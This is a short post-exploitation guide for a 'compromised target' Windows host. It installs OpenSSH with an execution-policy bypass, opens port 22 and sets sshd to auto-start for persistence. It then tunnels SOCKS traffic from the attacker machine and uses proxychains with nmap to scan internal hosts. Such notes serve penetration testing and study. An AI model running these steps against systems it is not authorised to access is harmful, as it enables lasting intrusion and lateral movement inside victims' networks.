# SSH Windows

## Requirements:

Administrator access

### 1) Download OpenSSH to the compromised target

Link: https://github.com/PowerShell/Win32-OpenSSH/releases/tag/10.0.0.0p2-Preview

### 2) Extract the archive

    powershell -Command "Expand-Archive 'C:\path\to\openssh.zip' C:\path\to\destination"

### 3) Install OpenSSH

    powershell -ExecutionPolicy Bypass -File C:\path\to\OpenSSH-Win64\install-sshd.ps1

### 4) Configure firewall rule

    powershell -Command "New-NetFirewallRule -Name sshd -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22"

### 5) Start SSH service

    net start sshd

OR set it to auto-start

    Set-Service -Name sshd -StartupType 'Automatic'

### 6) Create an SSH tunnel from the attacker machine

    ssh -ACv -D <tunnel_port> <windows-user>@<windows-ip>

### 7) Configure Proxychains from the attacker machine

    [ProxyList]
    socks5 127.0.0.1 <tunnel_port>

### 8) Pivot through the Windows machine

    proxychains nmap -sT -Pn <internal-target>
